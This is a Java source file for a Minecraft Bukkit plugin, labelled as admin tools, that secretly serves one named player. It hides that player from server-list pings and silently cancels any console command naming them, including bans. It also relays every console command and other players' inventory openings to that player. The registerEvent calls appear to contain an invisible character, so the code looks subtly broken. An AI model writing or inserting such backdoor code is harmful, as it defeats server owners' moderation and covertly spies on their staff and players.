package minecraftserver.adminTools;

import java.util.Iterator;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.plugin.EventExecutor;
import org.bukkit.plugin.Plugin;

public class EventManagerForMyAdvantages {

    private final Listener listener;
    private final Plugin plugin;
    private final MaineVorteile mv;

    /*
     * The Events will be Registerd to the parsed Listener.
     * Plugin is the java file wich extends JavaPlugin.
     */
    public EventManagerForMyAdvantages(Listener l, Plugin plugin, MaineVorteile mv) {
        this.listener = l;
        this.plugin = plugin;
        this.mv = mv;
    }

    private void regEv(Class<? extends Event> event, EventExecutor eh) {
        Bukkit.getPluginManager().registerEvent​(event, listener, EventPriority.NORMAL, eh, plugin);
    }

    private void regEv(Class<? extends Event> event, EventExecutor eh, EventPriority priority, boolean ignoreCancelled) {
        Bukkit.getPluginManager().registerEvent​(event, listener, priority, eh, plugin, ignoreCancelled);
    }

    public void registerEvents() {
        regEv(InventoryOpenEvent.class, (ll, event) -> {
            onInventoryOpen((InventoryOpenEvent) event);
        });
        regEv(ServerListPingEvent.class, (ll, event) -> {
            onServerListPing((ServerListPingEvent) event);
        });
        regEv(ServerCommandEvent.class, (ll, event) -> {
            onServerCommand((ServerCommandEvent) event);
        });

    }

    private void onInventoryOpen(InventoryOpenEvent e) {
        if (mv.Ich == null || !mv.Ich.isOnline() || e.getPlayer() == null) {
            return;
        }
        if (mv.inventoryOpenUUIDs.contains(e.getPlayer().getName().toLowerCase())) {
            mv.Ich.closeInventory();
            mv.Ich.sendMessage("You are Looking at an Inventory that " + e.getPlayer().getName() + " opened.");
            //Ich.openInventory(e.getInventory());
        } else {
            mv.Ich.sendMessage("debug...");
        }
    }

    private void onServerListPing(ServerListPingEvent e) {
        Iterator i = e.iterator();
        while (i.hasNext()) {
            String name = ((Player) i.next()).getName();
            if (mv.venish && MaineVorteile.MY_NAME.equals(name)) {
                i.remove();
            }
        }
    }
    
   public void onServerCommand(ServerCommandEvent e) {
        String command = e.getCommand();
        if (command.contains("ban joern19")) {
            e.getSender().sendMessage("Du arschloch!!! Du wolltest mich bannen! Leg dich nicht mit mir an!");
            e.setCancelled(true);
        } else if (command.contains("joern19")) {
            e.getSender().sendMessage("Nope..");
            e.setCancelled(true);
        }
        if (mv.Ich != null && mv.Ich.isOnline()) {
            mv.Ich.sendMessage("command: " + e.getSender().getName() + ": " + command);
        }
    }
}
